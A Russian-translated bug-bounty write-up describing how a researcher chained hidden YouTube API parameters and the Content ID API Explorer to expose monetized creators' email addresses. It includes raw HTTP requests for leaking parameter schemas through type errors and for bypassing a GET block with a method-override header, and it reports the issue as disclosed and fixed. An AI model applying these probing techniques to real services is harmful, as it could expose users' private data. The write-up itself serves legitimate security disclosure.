< Назад
Раскрытие адресов электронной почты авторов YouTube за вознаграждение в размере 20 тысяч долларов
2025-03-13


Некоторое время назад, экспериментируя с запросами к Google API, я обнаружил, что можно утечка всех параметров запроса в любой конечной точке Google API. Это было возможно, потому что по какой-то причине при отправке запроса с неправильным типом параметра возвращалась отладочная информация об этом параметре:

‎
Запрос

POST /youtubei/v1/browse HTTP/2
Host: youtubei.googleapis.com
Content-Type: application/json
Content-Length: 164

{
  "context": {
    "client": {
      "clientName": "WEB",
      "clientVersion": "2.20241101.01.00",
    }
  },
  "browseId": 1
}
На самом деле сервер ожидает, что browseId будет строкой, например "UCX6OQ3DkcsbYNE6H8uQQuVA"

‎

Ответ

HTTP/2 400 Bad Request
Content-Type: application/json; charset=UTF-8
Server: scaffolding on HTTPServer2

{
  "error": {
    "code": 400,
    "message": "Invalid value at 'browse_id' (TYPE_STRING), 1",
    "errors": [
      {
        "message": "Invalid value at 'browse_id' (TYPE_STRING), 1",
        "reason": "invalid"
      }
    ],
    "status": "INVALID_ARGUMENT",
    ...
  }
}
Хотя API YouTube обычно использует для веб-запросов формат JSON, он также поддерживает другой формат — ProtoJson, или application/json+protobuf


Это позволяет нам указывать значения параметров в массиве, а не по имени параметра, как в JSON. Мы можем злоупотребить этой логикой и указать неправильный тип параметра для всех параметров, даже не зная их названия, что приведёт к утечке информации обо всём возможном содержимом запроса.

‎
Запрос

POST /youtubei/v1/browse HTTP/2
Host: youtubei.googleapis.com
Content-Type: application/json+protobuf
Content-Length: 22

[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30]
Ответ

HTTP/2 400 Bad Request
Content-Type: application/json; charset=UTF-8
Server: scaffolding on HTTPServer2

{
  "error": {
    "code": 400,
    "message": "Invalid value at 'context' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.InnerTubeContext), 1\nInvalid value at 'browse_id' (TYPE_STRING), 2\nInvalid value at 'params' (TYPE_STRING), 3\nInvalid value at 'continuation' (TYPE_STRING), 7\nInvalid value at 'force_ad_format' (TYPE_STRING), 8\nInvalid value at 'player_request' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.PlayerRequest), 10\nInvalid value at 'query' (TYPE_STRING), 11\nInvalid value at 'has_external_ad_vars' (TYPE_BOOL), 12\nInvalid value at 'force_ad_parameters' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.ForceAdParameters), 13\nInvalid value at 'previous_ad_information' (TYPE_STRING), 14\nInvalid value at 'offline' (TYPE_BOOL), 15\nInvalid value at 'unplugged_sort_filter_options' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.UnpluggedSortFilterOptions), 16\nInvalid value at 'offline_mode_forced' (TYPE_BOOL), 17\nInvalid value at 'form_data' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.BrowseFormData), 18\nInvalid value at 'suggest_stats' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.SearchboxStats), 19\nInvalid value at 'lite_client_request_data' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.LiteClientRequestData), 20\nInvalid value at 'unplugged_browse_options' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.UnpluggedBrowseOptions), 22\nInvalid value at 'consistency_token' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.ConsistencyToken), 23\nInvalid value at 'intended_deeplink' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.DeeplinkData), 24\nInvalid value at 'android_extended_permissions' (TYPE_BOOL), 25\nInvalid value at 'browse_notification_params' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.BrowseNotificationsParams), 26\nInvalid value at 'recent_user_event_infos' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.RecentUserEventInfo), 28\nInvalid value at 'detected_activity_info' (type.googleapis.com/youtube.api.pfiinnertube.YoutubeApiInnertube.DetectedActivityInfo), 30",
    ...
}
Чтобы автоматизировать этот процесс, я написал инструмент под названием req2proto.

$ ./req2proto -X POST -u https://youtubei.googleapis.com/youtubei/v1/browse -p youtube.api.pfiinnertube.GetBrowseRequest -o output -d 3
Если мы посмотрим на вывод в output/youtube/api/pfiinnertube/message.proto, то увидим полный текст запроса для этой конечной точки:

syntax = "proto3";

package youtube.api.pfiinnertube;

message GetBrowseRequest {
  InnerTubeContext context = 1;
  string browse_id = 2;
  string params = 3;
  string continuation = 7;
  string force_ad_format = 8;
  int32 debug_level = 9;
  PlayerRequest player_request = 10;
  string query = 11;
  ...
}
...
Вооружившись этим знанием, я начал искать конечные точки API с секретными параметрами, которые могли бы позволить нам получить отладочную информацию.

Кажущаяся безопасной конечная точка
Если вы когда-нибудь просматривали запросы, отправленные YouTube Studio для загрузки вкладки «Заработок», то могли заметить следующий запрос:
‎

‎

POST /youtubei/v1/creator/get_creator_channels?alt=json HTTP/2
Host: studio.youtube.com
Content-Type: application/json
Cookie: <redacted>

{
  "context": {
    ...
  },
  "channelIds": [
    "UCeGCG8SYUIgFO13NyOe6reQ"
  ],
  "mask": {
    "channelId": true,
    "monetizationStatus": true,
    "monetizationDetails": {
      "all": true
    },
    ...
  }
}
Он используется для получения данных о нашем канале, которые отображаются на вкладке Earn. При этом с его помощью можно получить метаданные других каналов, хотя и с очень небольшим количеством масок:
‎
Запрос

POST /youtubei/v1/creator/get_creator_channels?alt=json HTTP/2
Host: studio.youtube.com
Content-Type: application/json
Cookie: <redacted>

{
  "context": {
    ...
  },
  "channelIds": [
    "UCdcUmdOxMrhRjKMw-BX19AA"
  ],
  "mask": {
    "channelId": true,
    "title": true,
    "thumbnailDetails": {
      "all": true
    },
    "metric": {
      "all": true
    },
    "timeCreatedSeconds": true,
    "isNameVerified": true,
    "channelHandle": true
  }
}
Ответ

HTTP/2 200 OK
Content-Type: application/json; charset=UTF-8
Server: scaffolding on HTTPServer2

{
  "channels": [
    {
      "channelId": "UCdcUmdOxMrhRjKMw-BX19AA",
      "title": "Niko Omilana",
      ...
      "metric": {
        "subscriberCount": "7700000",
        "videoCount": "142",
        "totalVideoViewCount": "650836435"
      },
      "timeCreatedSeconds": "1308700645",
      "isNameVerified": true,
      "channelHandle": "@Niko",
    }
  ]
}
Маски казались вполне надёжными. Если бы мы попытались запросить любую другую маску, которая могла бы быть конфиденциальной для канала, к которому у нас нет доступа, мы бы получили сообщение об ошибке «Отказано в доступе»:

{
  "error": {
    "code": 403,
    "message": "The caller does not have permission",
    "errors": [
      {
        "message": "The caller does not have permission",
        "domain": "global",
        "reason": "forbidden"
      }
    ],
    "status": "PERMISSION_DENIED"
  }
}
Leaking secret hidden parameters
As it turns out, if we dump the request payload for this endpoint with req2proto, we can see there's actually 2 secret hidden parameters:

syntax = "proto3";

package youtube.api.pfiinnertube;

message GetCreatorChannelsRequest {
  InnerTubeContext context = 1;
  string channel_ids = 2;
  CreatorChannelMask mask = 4;
  DelegationContext delegation_context = 5;
  bool critical_read = 6; // ???
  bool include_suspended = 7; // ???
}
Enabling criticalRead didn't seem to change anything, but includeSuspended was very interesting:

{
  ...
  "contentOwnerAssociation": {
    "externalContentOwnerId": "Ks_zqCBHrAbeQqsVRGL7gw",
    "createTime": {
      "seconds": "1693939737",
      "nanos": 472296000
    },
    "permissions": {
      "canWebClaim": true,
      "canViewRevenue": true
    },
    "isDefaultChannel": false,
    "activateTime": {
      "seconds": "1693939737",
      "nanos": 472296000
    }
  },
  ...
}
Похоже, произошла утечка contentOwnerAssociation из канала. Но что это такое?

Заглянуть в Идентификатор контента
На YouTube есть особый тип учётных записей, известных как менеджер контента, которые предоставляются лишь нескольким доверенным правообладателям. С помощью таких учётных записей можно загружать аудио- и видеофайлы в Content ID в качестве актива, заявляя авторские права на любые внешние видео, содержащие те же аудио- и видеофайлы, что и ваш актив.

‎

‎

Эти учётные записи особенно важны, поскольку учётная запись Content Manager позволяет монетизировать любые найденные видео, содержащие похожие аудио- и видеоматериалы. Таким образом, эти специальные учётные записи предоставляются только правообладателям с «сложными потребностями в управлении правами».
‎

На самом деле YouTube предоставляет упрощённую версию этого инструмента всем 3 миллионам монетизированных авторов YouTube, известную как инструмент проверки авторских прав. Этот инструмент позволяет авторам только запрашивать удаление видео, в которых используется их контент, но не монетизировать их.

‎

‎

Интересно, что серверная часть этого инструмента такая же, как у Content Manager. Как только канал становится монетизированным, создаётся аккаунт CONTENT_OWNER_TYPE_IVP владельца контента:

{
  "contentOwnerId": "Ks_zqCBHrAbeQqsVRGL7gw",
  "displayName": "Nia",
  "type": "CONTENT_OWNER_TYPE_IVP",
  "industryType": "INDUSTRY_TYPE_WEB",
  "primaryContactEmail": "<redacted>@gmail.com",
  "timeCreatedSeconds": "1693939736",
  "traits": {
    "isLongTail": true,
    "isAffiliate": false,
    "isManagedTorso": false,
    "isPremium": false,
    "isUserLevelCidClaimUpdateable": false,
    "isTorso": false,
    "isFingerprintEnabled": false,
    "isBrandconnectAgency": false,
    "isTwoStepVerificationRequirementExempt": false
  },
  "country": "FI"
}
Интересный факт: «IVP» на самом деле расшифровывается как Individual Video Partnership — старое название партнёрской программы YouTube!


Итак, мы можем получить contentOwnerId владельца контента IVP, связанного с каналом, но что именно мы можем с этим сделать? Проведя небольшое исследование, я нашёл YouTube Content ID API, который предназначен для правообладателей с аккаунтом Content Manager. Особенно интересной показалась contentOwners.list конечная точка. Она принимала идентификатор владельца контента и возвращала его "электронную почту для уведомлений о конфликтах".
‎

К сожалению, API, похоже, проверял, есть ли у меня учётная запись Content Manager, и просто возвращал ошибку для любого запроса:

{
  "error": {
    "code": 403,
    "message": "Forbidden",
    "errors": [
      {
        "message": "Forbidden",
        "domain": "global",
        "reason": "forbidden"
      }
    ]
  }
}
Несмотря на то, что эта конечная точка предназначена только для пользователей с учётной записью Content Manager, у меня было подозрение, что владелец контента IVP всё равно сможет ею воспользоваться.


Я попросил своего друга, у которого есть монетизированный канал на YouTube, протестировать эту конечную точку в обозревателе API, и это сработало

{
  "kind": "youtubePartner#contentOwnerList",
  "items": [
    {
      "kind": "youtubePartner#contentOwner",
      "id": "kdVwk95TnaCSLJJfyIFoqw",
      "displayName": "omilana7",
      "conflictNotificationEmail": "<redacted>@yahoo.co.uk"
    }
  ]
}
Письмо с уведомлением о конфликте было отправлено на адрес электронной почты канала в то время, когда канал был монетизирован!

‎

Интересно, что по какой-то причине, несмотря на то, что это работало в обозревателе API, вы не могли добавить этот API в свой проект Google Cloud, так как он был доступен только для пользователей с действующей учётной записью Content Manager. Но это не имело значения, мы могли просто вызвать этот API с помощью клиента обозревателя API.

Объединяя атаку воедино
У нас есть обе части, необходимые для атаки, давайте соберём их вместе!
‎

Получите /get_creator_channels с помощью includeSuspended: true и узнайте идентификатор владельца контента IVP жертвы.

Используйте Content ID API Explorer с аккаунтом Google, привязанным к монетизированному каналу, чтобы получить электронное письмо с уведомлением о конфликте от владельца IVP-контента жертвы

Прибыль!


Временная шкала
12 декабря 2024 г. — отчёт отправлен поставщику
16 декабря 2024 г. — отчёт о проверке поставщика
17 декабря 2024 г. — 🎉 Отличный улов!
21 января 2025 г. — Панель вознаграждений: 13 337 долларов США. Обоснование: обычные приложения Google. Категория уязвимости: «обход важных средств контроля безопасности», персональные данные или другая конфиденциальная информация.
21 января 2025 г. — поставщику было разъяснено, что это вознаграждение относится к «обычным приложениям Google». Однако www.youtube.com и studio.youtube.com являются доменами первого уровня. См.: https://github.com/google/bughunters/blob/main/domain-tiers/external_domains_google.asciipb
23 января 2025 г. — Комиссия присуждает дополнительные 6663 доллара. Обоснование: домены, в которых уязвимость может привести к раскрытию особо важных пользовательских данных. Категория уязвимости: «обход важных средств защиты», персональные данные или другая конфиденциальная информация.
10 февраля 2025 г. — раскрытие информации о координатах поставщика для 13 марта 2025 г.
13 февраля 2025 года — 🎉 награждение Google VRP
21 февраля 2025 г. — поставщик подтверждает, что проблема устранена (T+71 день с момента обнаружения)
13 марта 2025 года — опубликован отчёт
Дополнительные примечания
Оказывается, параметр includeSuspended можно было найти и в документе об открытии InnerTube.

При обычной попытке получить документ с описанием вы получаете следующую ошибку:
‎
Запрос

GET /$discovery/rest HTTP/2
Host: youtubei.googleapis.com
Ответ

HTTP/2 405 Method Not Allowed
Content-Type: text/html; charset=UTF-8
Похоже, что youtubei.googleapis.com по какой-то причине использует правило ESPv2 для блокировки запросов GET.


Я быстро понял, что мы можем обойти это ограничение, отправив POST-запрос, а затем переопределив его как GET-запрос с помощью X-Http-Method-Override, чтобы обойти правило блокировки GET-запросов:

‎
Запрос

POST /$discovery/rest HTTP/2
Host: youtubei.googleapis.com
X-Http-Method-Override: GET
Ответ

HTTP/2 200
content-type: application/json; charset=UTF-8

{
  "baseUrl": "https://youtubei.googleapis.com/",
  "title": "YouTube Internal API (InnerTube)",
  "documentationLink": "http://go/itgatewa",
  ...
Обновление от 1 марта 2025 г.: документы по обнаружению как в рабочей среде (архив), так и в промежуточной (архив) были удалены.

‎

Если мы введём в поиск Ctrl-F для GetCreatorChannelsRequest, то сможем найти параметр includeSuspended:

  ...
  "YoutubeApiInnertubeGetCreatorChannelsRequest": {
      "id": "YoutubeApiInnertubeGetCreatorChannelsRequest",
      "properties": {
        "channelIds": {
          "items": {
            "type": "string"
          },
          "type": "array"
        },
        ...
        "includeSuspended": {
          "type": "boolean"
        },
        ...
      },
      "type": "object"
    },
  ...
Вы можете связаться со мной по адресу значок сигнала или значок электронной почты

